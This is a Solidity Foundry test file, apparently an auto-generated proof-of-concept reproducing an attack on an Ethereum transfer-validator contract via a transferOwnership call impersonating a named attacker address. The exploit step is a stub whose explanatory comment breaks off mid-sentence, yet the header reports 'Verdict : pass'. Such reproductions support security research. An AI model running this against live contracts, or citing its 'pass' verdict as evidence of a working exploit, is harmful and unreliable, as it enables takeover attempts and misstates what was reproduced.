// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x6dd31a526ee3ddbc7be888b729a445695c03148e
// Attack Contract : 0xe7eba1cea51ec9b3accc16728e3b8786560c59d5
// Vulnerable Contract : 0xe7eba1cea51ec9b3accc16728e3b8786560c59d5
// Attack Tx : 0xe9e7f33ebfe2230c147e6e0321f5f2c7de1b89fe9fc08830fc3f8ac5845bc9f0
// Block : 24501847
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : unpriced_reproduction
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.TransferValidatorWithPayload;
    address constant TRANSFER_OWNERSHIP_ARG = Addresses.A_E6A191_55D9;
    uint256 constant FORK_BLOCK = 24501846;
    uint256 constant TX_TIMESTAMP = 1771636055;
    uint256 constant TX_BLOCK_NUMBER = 24501847;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        TransferValidatorAttack attack = _deployAttack();
        _prepareProfit(attack);
        bytes memory entryData = abi.encodeWithSelector(bytes4(0xf2fde38b), TRANSFER_OWNERSHIP_ARG);
        (bool ok, bytes memory result) = address(attack).call{value: TX_VALUE}(entryData);
        if (!ok) {
            assembly {
                revert(add(result, 32), mload(result))
            }
        }
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (TransferValidatorAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = TransferValidatorAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new TransferValidatorAttack();
        }
    }

    function _prepareProfit(TransferValidatorAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(TransferValidatorAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal pure override {
        attack;
        attackChild;
    }
}

contract TransferValidatorAttack {
    receive() external payable {}

    function transferOwnership(address newOwner) external payable {
        newOwner;
        // STRUCTURED GAP: the handoff observes a slot-0 owner write to
        // 0xe6a191a894dd3c85e3c89926e9f476f818ee55d9, but action_graph marks
        // that write as pseudocode-only and not semantic-backed. The product PoC
        // therefore preserves selector reachability without synthesizing sstore,
    }
}

library Addresses {
    address internal constant attacker_eoa = 0x6dd31a526eE3DdBC7BE888b729A445695c03148e;
    address internal constant A_E6A191_55D9 = 0xE6A191a894dD3c85e3c89926e9f476F818eE55d9;
    address internal constant TransferValidatorWithPayload = 0xE7eBA1CEA51EC9B3AcCC16728e3B8786560c59d5;
}

interface ITransferValidatorWithPayload {
    function transferOwnership(address) external payable;
}
